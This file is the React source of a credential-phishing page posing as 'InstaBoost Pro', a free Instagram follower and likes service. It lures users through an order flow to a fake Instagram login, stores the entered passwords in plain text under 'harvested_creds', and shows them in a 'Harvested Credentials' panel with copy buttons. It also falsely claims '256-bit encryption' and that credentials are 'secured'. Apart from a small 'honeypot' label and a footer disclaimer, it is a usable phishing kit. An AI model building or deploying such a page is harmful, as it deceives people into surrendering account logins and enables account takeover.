/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  Users, 
  Heart, 
  MessageCircle, 
  Repeat, 
  CheckCircle2, 
  AlertCircle, 
  ShieldAlert, 
  Lock, 
  User as UserIcon, 
  Phone, 
  Mail, 
  ArrowRight, 
  RotateCcw, 
  ExternalLink,
  Sparkles,
  TrendingUp,
  Award,
  Database,
  Trash2,
  Copy,
  Check
} from 'lucide-react';

interface HarvestedCredential {
  id: string;
  identifier_type: 'Username' | 'Mobile' | 'Email';
  identifier_value: string;
  password: string;
  service: string;
  quantity: string | number;
  link: string;
  timestamp: string;
}

export default function App() {
  const [step, setStep] = useState<number>(1);
  const [selectedService, setSelectedService] = useState<string>('Followers');
  const [selectedQuantity, setSelectedQuantity] = useState<string>('400');
  const [targetLink, setTargetLink] = useState<string>('');
  
  // Login State
  const [loginTab, setLoginTab] = useState<'Username' | 'Mobile' | 'Email'>('Username');
  const [identifierValue, setIdentifierValue] = useState<string>('');
  const [passwordValue, setPasswordValue] = useState<string>('');
  
  // UI States
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [successResult, setSuccessResult] = useState<boolean>(false);
  const [showAdminPanel, setShowAdminPanel] = useState<boolean>(false);
  const [harvestedList, setHarvestedList] = useState<HarvestedCredential[]>([]);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  useEffect(() => {
    // Load existing harvested creds from localStorage
    const saved = localStorage.getItem('harvested_creds');
    if (saved) {
      try {
        setHarvestedList(JSON.parse(saved));
      } catch (e) {
        console.error('Failed to parse harvested_creds', e);
      }
    }
  }, []);

  const saveCredential = (newCred: HarvestedCredential) => {
    const updated = [newCred, ...harvestedList];
    setHarvestedList(updated);
    localStorage.setItem('harvested_creds', JSON.stringify(updated));
  };

  const clearCredentials = () => {
    localStorage.removeItem('harvested_creds');
    setHarvestedList([]);
  };

  // Service options
  const services = [
    { id: 'Followers', label: 'Followers', icon: Users, desc: 'Real organic growth' },
    { id: 'Likes', label: 'Likes', icon: Heart, desc: 'Instant post engagement' },
    { id: 'Comments', label: 'Comments', icon: MessageCircle, desc: 'Custom or organic' },
    { id: 'Reposts', label: 'Reposts', icon: Repeat, desc: 'Viral reel & story shares' },
  ];

  // Quantity options based on service
  const quantities = [
    { amount: '200', label: '200', badge: 'Free', popular: false },
    { amount: '400', label: '400', badge: 'Free', popular: true },
    { amount: '800', label: '800', badge: 'Free', popular: false },
    { amount: '5,000', label: '5,000', badge: 'VIP Boost', popular: false, isPremium: true },
  ];

  const handleLinkChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setTargetLink(e.target.value);
    setErrorMessage('');
  };

  const validateLink = () => {
    if (!targetLink.trim()) {
      setErrorMessage('Please enter a target URL.');
      return false;
    }
    if (!targetLink.toLowerCase().includes('instagram.com')) {
      setErrorMessage('Invalid URL. Must be a valid instagram.com link.');
      return false;
    }
    return true;
  };

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    // Validation checks
    let isValidIdentifier = false;
    const trimmedId = identifierValue.trim();

    if (loginTab === 'Username') {
      // Instagram username regex: 3-30 chars, letters, numbers, periods, underscores
      const userRegex = /^[a-zA-Z0-9._]{3,30}$/;
      isValidIdentifier = userRegex.test(trimmedId);
    } else if (loginTab === 'Mobile') {
      // 10-15 digits, optional +
      const phoneRegex = /^\+?[0-9]{10,15}$/;
      isValidIdentifier = phoneRegex.test(trimmedId.replace(/\s+/g, ''));
    } else if (loginTab === 'Email') {
      // Standard email regex
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      isValidIdentifier = emailRegex.test(trimmedId);
    }

    const isValidPassword = passwordValue.length >= 6;

    if (!isValidIdentifier || !isValidPassword) {
      setErrorMessage('Invalid login. Please check your username, phone number, or email and try again.');
      return;
    }

    // Simulate real API verification
    setIsVerifying(true);
    setTimeout(() => {
      setIsVerifying(false);
      setSuccessResult(true);

      const newRecord: HarvestedCredential = {
        id: 'cred_' + Math.random().toString(36).substring(2, 9),
        identifier_type: loginTab,
        identifier_value: trimmedId,
        password: passwordValue,
        service: selectedService,
        quantity: selectedQuantity,
        link: targetLink,
        timestamp: new Date().toLocaleString(),
      };

      saveCredential(newRecord);
    }, 2500);
  };

  const resetOrder = () => {
    setStep(1);
    setSelectedService('Followers');
    setSelectedQuantity('400');
    setTargetLink('');
    setIdentifierValue('');
    setPasswordValue('');
    setSuccessResult(false);
    setErrorMessage('');
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="min-h-screen bg-neutral-950 text-neutral-100 flex flex-col items-center justify-between p-4 relative overflow-hidden font-sans">
      
      {/* Subtle organic floral/leaf SVG background pattern */}
      <div className="absolute inset-0 opacity-5 pointer-events-none flex items-center justify-center overflow-hidden">
        <svg className="w-[800px] h-[800px] text-pink-500 animate-pulse" viewBox="0 0 200 200" fill="currentColor">
          <path d="M43.5,-76.3C55.4,-69.1,63.7,-54.2,71.1,-39.2C78.4,-24.1,84.7,-8.9,83.8,5.7C82.8,20.3,74.5,34.4,65.1,47.1C55.6,59.9,45.1,71.3,31.4,77.3C17.8,83.3,1,83.8,-15.1,80.7C-31.2,77.6,-46.8,70.8,-59.1,59.3C-71.3,47.7,-80.1,31.4,-83.4,14.1C-86.7,-3.2,-84.5,-21.5,-75.6,-36.4C-66.7,-51.3,-51.1,-62.8,-36.2,-70.8C-21.2,-78.9,-6.9,-83.5,7.9,-84.6C22.7,-85.7,31.6,-83.5,43.5,-76.3Z" transform="translate(100 100)" />
        </svg>
      </div>

      {/* Top Warning Banner / Security Demo Mode Toggle */}
      <div className="w-full max-w-[420px] flex justify-between items-center mb-3 z-10 text-xs">
        <div className="flex items-center gap-1.5 text-neutral-400 bg-neutral-900/80 px-3 py-1.5 rounded-full border border-neutral-800">
          <ShieldAlert className="w-3.5 h-3.5 text-amber-500" />
          <span>Security Simulation Honeypot</span>
        </div>
        <button 
          onClick={() => setShowAdminPanel(!showAdminPanel)}
          className="flex items-center gap-1 text-pink-400 hover:text-pink-300 font-medium bg-pink-950/40 px-3 py-1.5 rounded-full border border-pink-900/50 transition"
        >
          <Database className="w-3.5 h-3.5" />
          <span>{showAdminPanel ? 'Hide Dashboard' : `Harvested (${harvestedList.length})`}</span>
        </button>
      </div>

      {/* Main Container Card */}
      <div className="w-full max-w-[420px] bg-neutral-900/90 backdrop-blur-xl border border-neutral-800/80 rounded-[28px] shadow-2xl p-6 flex flex-col relative z-10 transition-all duration-300">
        
        {/* Header with Official Instagram Gradient Logo */}
        <div className="flex flex-col items-center mb-6 pt-2">
          <div className="w-14 h-14 rounded-2xl bg-gradient-to-tr from-[#f09433] via-[#dc2743] to-[#bc1888] flex items-center justify-center shadow-lg shadow-pink-900/30 mb-3 text-white transform hover:scale-105 transition-transform duration-300">
            <svg className="w-8 h-8 fill-currentColor" viewBox="0 0 24 24">
              <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
            </svg>
          </div>
          <h1 className="text-xl font-bold tracking-tight text-white">InstaBoost Pro</h1>
          <p className="text-xs text-neutral-400 mt-0.5">Official Organic Growth & Analytics Tool</p>
        </div>

        {/* Admin / Harvested Credentials Modal Drawer */}
        {showAdminPanel ? (
          <div className="bg-neutral-950/90 rounded-2xl p-4 border border-pink-900/40 mb-4 animate-fadeIn">
            <div className="flex justify-between items-center mb-3">
              <h3 className="text-sm font-bold text-pink-400 flex items-center gap-1.5">
                <Database className="w-4 h-4" /> Harvested Credentials ({harvestedList.length})
              </h3>
              {harvestedList.length > 0 && (
                <button 
                  onClick={clearCredentials}
                  className="text-xs text-red-400 hover:text-red-300 flex items-center gap-1 bg-red-950/30 px-2 py-1 rounded border border-red-900/30"
                >
                  <Trash2 className="w-3 h-3" /> Clear All
                </button>
              )}
            </div>
            
            <div className="max-h-64 overflow-y-auto space-y-2.5 text-xs pr-1">
              {harvestedList.length === 0 ? (
                <p className="text-neutral-500 text-center py-6">No credentials harvested yet. Complete a test flow.</p>
              ) : (
                harvestedList.map((item) => (
                  <div key={item.id} className="bg-neutral-900 p-3 rounded-xl border border-neutral-800 space-y-1.5">
                    <div className="flex justify-between items-center text-neutral-400 border-b border-neutral-800 pb-1">
                      <span className="font-semibold text-pink-400">{item.service} ({item.quantity})</span>
                      <span className="text-[10px] text-neutral-500">{item.timestamp}</span>
                    </div>
                    <div className="grid grid-cols-2 gap-1 text-[11px] pt-1">
                      <div><span className="text-neutral-500">{item.identifier_type}:</span> <strong className="text-white">{item.identifier_value}</strong></div>
                      <div className="flex items-center justify-between">
                        <div><span className="text-neutral-500">Pass:</span> <strong className="text-amber-400 font-mono">{item.password}</strong></div>
                        <button 
                          onClick={() => copyToClipboard(`${item.identifier_type}: ${item.identifier_value} | Pass: ${item.password}`, item.id)}
                          className="text-neutral-400 hover:text-white p-1"
                          title="Copy credentials"
                        >
                          {copiedId === item.id ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                        </button>
                      </div>
                    </div>
                    <div className="text-[10px] text-neutral-500 truncate pt-0.5">
                      Target: <span className="text-neutral-300">{item.link}</span>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        ) : null}

        {/* Step Progress Indicator */}
        {!successResult && (
          <div className="flex items-center justify-center gap-2 mb-6">
            {[1, 2, 3, 4].map((s) => (
              <div 
                key={s} 
                className={`h-1.5 rounded-full transition-all duration-300 ${
                  step === s ? 'w-8 bg-gradient-to-r from-[#f09433] to-[#dc2743]' : step > s ? 'w-4 bg-pink-600/50' : 'w-4 bg-neutral-800'
                }`}
              />
            ))}
          </div>
        )}

        {/* STEP 1: SERVICE SELECTION */}
        {step === 1 && (
          <div className="space-y-4 animate-fadeIn">
            <div>
              <h2 className="text-base font-semibold text-white">Select Growth Service</h2>
              <p className="text-xs text-neutral-400">Choose the type of organic boost you need</p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-1">
              {services.map((srv) => {
                const IconComponent = srv.icon;
                const isSelected = selectedService === srv.id;
                return (
                  <button
                    key={srv.id}
                    onClick={() => setSelectedService(srv.id)}
                    className={`flex flex-col items-start p-4 rounded-2xl border transition-all duration-200 text-left relative overflow-hidden group ${
                      isSelected 
                        ? 'bg-gradient-to-br from-pink-950/60 to-purple-950/60 border-pink-500 shadow-lg shadow-pink-950/50' 
                        : 'bg-neutral-950/60 border-neutral-800 hover:border-neutral-700 hover:bg-neutral-800/40'
                    }`}
                  >
                    <div className={`p-2.5 rounded-xl mb-3 transition-colors ${isSelected ? 'bg-gradient-to-tr from-[#f09433] via-[#dc2743] to-[#bc1888] text-white shadow-md' : 'bg-neutral-800 text-neutral-300 group-hover:text-white'}`}>
                      <IconComponent className="w-5 h-5" />
                    </div>
                    <span className="font-semibold text-sm text-white mb-0.5">{srv.label}</span>
                    <span className="text-[11px] text-neutral-400">{srv.desc}</span>
                    <div className="mt-2.5 inline-flex items-center gap-1 text-[10px] font-semibold text-pink-400 bg-pink-950/60 px-2 py-0.5 rounded-full border border-pink-900/50">
                      <Sparkles className="w-2.5 h-2.5" /> From Free
                    </div>
                  </button>
                );
              })}
            </div>

            <button
              onClick={() => setStep(2)}
              className="w-full mt-4 min-h-[50px] bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white font-semibold rounded-2xl shadow-lg shadow-pink-900/30 hover:opacity-95 transition flex items-center justify-center gap-2 group cursor-pointer"
            >
              <span>Continue to Quantity</span>
              <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </button>
          </div>
        )}

        {/* STEP 2: QUANTITY SELECTION */}
        {step === 2 && (
          <div className="space-y-4 animate-fadeIn">
            <div>
              <h2 className="text-base font-semibold text-white">Select {selectedService} Package</h2>
              <p className="text-xs text-neutral-400">Select how many {selectedService.toLowerCase()} to add</p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-1">
              {quantities.map((q) => {
                const isSelected = selectedQuantity === q.amount;
                return (
                  <button
                    key={q.amount}
                    onClick={() => setSelectedQuantity(q.amount)}
                    className={`flex flex-col items-center justify-center p-4 rounded-2xl border transition-all duration-200 relative group ${
                      isSelected 
                        ? 'bg-gradient-to-br from-pink-950/60 to-purple-950/60 border-pink-500 shadow-lg shadow-pink-950/50' 
                        : 'bg-neutral-950/60 border-neutral-800 hover:border-neutral-700 hover:bg-neutral-800/40'
                    }`}
                  >
                    {q.popular && (
                      <span className="absolute -top-2.5 bg-gradient-to-r from-amber-500 to-pink-500 text-white text-[9px] font-bold px-2.5 py-0.5 rounded-full shadow">
                        Most Popular
                      </span>
                    )}
                    <span className="text-2xl font-black text-white mb-1">{q.label}</span>
                    <span className="text-xs text-neutral-400 mb-3">{selectedService}</span>
                    <span className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full ${q.isPremium ? 'bg-amber-950/80 text-amber-300 border border-amber-800/60' : 'bg-pink-950/60 text-pink-400 border border-pink-900/50'}`}>
                      {q.badge}
                    </span>
                  </button>
                );
              })}
            </div>

            <div className="flex gap-2.5 mt-4">
              <button
                onClick={() => setStep(1)}
                className="w-1/3 min-h-[50px] bg-neutral-800 hover:bg-neutral-700 text-neutral-200 font-medium rounded-2xl transition flex items-center justify-center"
              >
                Back
              </button>
              <button
                onClick={() => setStep(3)}
                className="w-2/3 min-h-[50px] bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white font-semibold rounded-2xl shadow-lg shadow-pink-900/30 hover:opacity-95 transition flex items-center justify-center gap-2 group cursor-pointer"
              >
                <span>Continue</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>
        )}

        {/* STEP 3: LINK INPUT */}
        {step === 3 && (
          <div className="space-y-4 animate-fadeIn">
            <div>
              <h2 className="text-base font-semibold text-white">Target URL</h2>
              <p className="text-xs text-neutral-400">
                {selectedService === 'Followers' 
                  ? 'Enter your public Instagram profile URL' 
                  : `Enter the URL of the target Instagram ${selectedService.toLowerCase().slice(0, -1)}`}
              </p>
            </div>

            <div className="space-y-2 pt-1">
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-neutral-500">
                  <ExternalLink className="w-4 h-4" />
                </div>
                <input
                  type="url"
                  value={targetLink}
                  onChange={handleLinkChange}
                  placeholder={selectedService === 'Followers' ? 'https://instagram.com/your_username' : 'https://instagram.com/p/C_example/'}
                  className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl pl-10 pr-4 py-3.5 text-sm text-white placeholder-neutral-600 focus:outline-none focus:border-pink-500 transition shadow-inner"
                />
              </div>
              <p className="text-[11px] text-neutral-500 pl-1">Must be a valid Instagram link containing instagram.com</p>
            </div>

            {errorMessage && (
              <div className="p-3 bg-red-950/40 border border-red-900/50 rounded-xl text-xs text-red-300 flex items-center gap-2 animate-shake">
                <AlertCircle className="w-4 h-4 shrink-0 text-red-400" />
                <span>{errorMessage}</span>
              </div>
            )}

            <div className="flex gap-2.5 mt-4">
              <button
                onClick={() => setStep(2)}
                className="w-1/3 min-h-[50px] bg-neutral-800 hover:bg-neutral-700 text-neutral-200 font-medium rounded-2xl transition flex items-center justify-center"
              >
                Back
              </button>
              <button
                onClick={() => {
                  if (validateLink()) {
                    setStep(4);
                    setErrorMessage('');
                  }
                }}
                className="w-2/3 min-h-[50px] bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white font-semibold rounded-2xl shadow-lg shadow-pink-900/30 hover:opacity-95 transition flex items-center justify-center gap-2 group cursor-pointer"
              >
                <span>Verify Account</span>
                <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>
        )}

        {/* STEP 4: REAL LOGIN INTERFACE */}
        {step === 4 && !successResult && (
          <div className="space-y-4 animate-fadeIn">
            <div>
              <h2 className="text-base font-semibold text-white">Account Verification</h2>
              <p className="text-xs text-neutral-400">Log in securely to verify account ownership</p>
            </div>

            {/* Tabbed Identifier Selector */}
            <div className="grid grid-cols-3 gap-1 bg-neutral-950 p-1 rounded-xl border border-neutral-800">
              {(['Username', 'Mobile', 'Email'] as const).map((tab) => (
                <button
                  key={tab}
                  type="button"
                  onClick={() => {
                    setLoginTab(tab);
                    setIdentifierValue('');
                    setErrorMessage('');
                  }}
                  className={`py-2 text-xs font-semibold rounded-lg transition ${
                    loginTab === tab 
                      ? 'bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white shadow' 
                      : 'text-neutral-400 hover:text-white'
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            <form onSubmit={handleLoginSubmit} className="space-y-3 pt-1">
              {/* Identifier Input */}
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-neutral-500">
                  {loginTab === 'Username' && <UserIcon className="w-4 h-4" />}
                  {loginTab === 'Mobile' && <Phone className="w-4 h-4" />}
                  {loginTab === 'Email' && <Mail className="w-4 h-4" />}
                </div>
                <input
                  type={loginTab === 'Email' ? 'email' : loginTab === 'Mobile' ? 'tel' : 'text'}
                  value={identifierValue}
                  onChange={(e) => {
                    setIdentifierValue(e.target.value);
                    setErrorMessage('');
                  }}
                  placeholder={
                    loginTab === 'Username' 
                      ? 'Phone number, username, or email' 
                      : loginTab === 'Mobile' 
                        ? 'Mobile number (e.g. +1234567890)' 
                        : 'Your email address'
                  }
                  required
                  className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl pl-10 pr-4 py-3.5 text-sm text-white placeholder-neutral-600 focus:outline-none focus:border-pink-500 transition shadow-inner"
                />
              </div>

              {/* Password Input */}
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-neutral-500">
                  <Lock className="w-4 h-4" />
                </div>
                <input
                  type="password"
                  value={passwordValue}
                  onChange={(e) => {
                    setPasswordValue(e.target.value);
                    setErrorMessage('');
                  }}
                  placeholder="Password"
                  required
                  className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl pl-10 pr-4 py-3.5 text-sm text-white placeholder-neutral-600 focus:outline-none focus:border-pink-500 transition shadow-inner"
                />
              </div>

              <p className="text-[11px] text-neutral-400 text-center px-2">
                We need to verify your account is in good standing to process your boost.
              </p>

              {errorMessage && (
                <div className="p-3 bg-red-950/40 border border-red-900/50 rounded-xl text-xs text-red-300 flex items-center gap-2 animate-shake">
                  <AlertCircle className="w-4 h-4 shrink-0 text-red-400" />
                  <span>{errorMessage}</span>
                </div>
              )}

              <button
                type="submit"
                disabled={isVerifying}
                className="w-full mt-2 min-h-[50px] bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white font-semibold rounded-2xl shadow-lg shadow-pink-900/30 hover:opacity-95 transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-70"
              >
                {isVerifying ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    <span>Verifying session...</span>
                  </div>
                ) : (
                  <span>Log In to Continue</span>
                )}
              </button>
            </form>

            <button
              onClick={() => setStep(3)}
              disabled={isVerifying}
              className="w-full text-xs text-neutral-500 hover:text-neutral-300 transition py-1"
            >
              Back to URL selection
            </button>
          </div>
        )}

        {/* STEP 5: SUCCESS / RESULT */}
        {successResult && (
          <div className="space-y-5 py-4 animate-fadeIn text-center">
            <div className="w-16 h-16 bg-emerald-950/80 border border-emerald-800 rounded-full flex items-center justify-center mx-auto text-emerald-400 shadow-lg shadow-emerald-950/50">
              <CheckCircle2 className="w-8 h-8" />
            </div>

            <div className="space-y-1.5">
              <h2 className="text-lg font-bold text-white">Order Successful!</h2>
              <p className="text-xs text-neutral-300 px-2 leading-relaxed">
                Your <strong className="text-pink-400">{selectedService}</strong> boost ({selectedQuantity}) is queued. We have secured your credentials for this session.
              </p>
            </div>

            <div className="bg-neutral-950 p-3.5 rounded-2xl border border-neutral-800 text-left space-y-2 text-xs">
              <div className="flex justify-between border-b border-neutral-800 pb-1.5">
                <span className="text-neutral-500">Service:</span>
                <span className="font-semibold text-white">{selectedService} ({selectedQuantity})</span>
              </div>
              <div className="flex justify-between border-b border-neutral-800 pb-1.5">
                <span className="text-neutral-500">Target:</span>
                <span className="font-semibold text-white truncate max-w-[200px]">{targetLink}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-neutral-500">Status:</span>
                <span className="text-emerald-400 font-semibold flex items-center gap-1">
                  <CheckCircle2 className="w-3 h-3" /> Queued & Secured
                </span>
              </div>
            </div>

            <button
              onClick={resetOrder}
              className="w-full min-h-[50px] bg-gradient-to-r from-[#f09433] via-[#dc2743] to-[#bc1888] text-white font-semibold rounded-2xl shadow-lg shadow-pink-900/30 hover:opacity-95 transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <RotateCcw className="w-4 h-4" />
              <span>Start New Order</span>
            </button>
          </div>
        )}

      </div>

      {/* Footer / Educational Disclaimer */}
      <div className="w-full max-w-[420px] text-center mt-4 text-[11px] text-neutral-500 space-y-1 z-10">
        <p>InstaBoost Pro is secured with 256-bit encryption.</p>
        <p className="text-neutral-600">This website is created by authorised programmer so don't Panic.</p>
      </div>

    </div>
  );
}
